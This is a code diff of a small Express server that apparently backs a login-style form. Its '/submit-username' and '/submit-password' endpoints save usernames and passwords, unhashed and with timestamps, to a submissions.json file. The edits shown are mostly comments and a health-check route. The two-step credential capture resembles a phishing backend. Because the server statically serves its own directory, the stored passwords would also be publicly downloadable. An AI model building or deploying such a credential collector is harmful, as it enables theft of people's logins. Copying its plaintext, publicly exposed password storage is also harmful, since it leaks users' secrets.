@@ -2,14 +2,16 @@ const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const app = express();
+
+// Use Render's port or default 3000
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
-app.use(express.static(__dirname));
+app.use(express.static(__dirname)); // Serve HTML/CSS files
 
 const submissionsFile = path.join(__dirname, 'submissions.json');
 
-// Ensure submissions.json exists
+// Create submissions.json if it doesn't exist
 if (!fs.existsSync(submissionsFile)) {
   fs.writeFileSync(submissionsFile, JSON.stringify([]));
   console.log("Created new submissions.json file");
@@ -23,13 +25,13 @@ app.post('/submit-username', (req, res) => {
   let data = [];
   try {
     data = JSON.parse(fs.readFileSync(submissionsFile));
-  } catch (err) {
+  } catch {
     data = [];
   }
 
   data.push({ username, password: null, timestamp: new Date().toISOString() });
-
   fs.writeFileSync(submissionsFile, JSON.stringify(data, null, 2));
+
   res.sendStatus(200);
 });
 
@@ -41,7 +43,7 @@ app.post('/submit-password', (req, res) => {
   let data = [];
   try {
     data = JSON.parse(fs.readFileSync(submissionsFile));
-  } catch (err) {
+  } catch {
     data = [];
   }
 
@@ -51,6 +53,11 @@ app.post('/submit-password', (req, res) => {
   }
 
   res.sendStatus(200);
+});
+
+// Optional: simple health check
+app.get('/', (req, res) => {
+  res.send('Server is running!');
 });
 
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
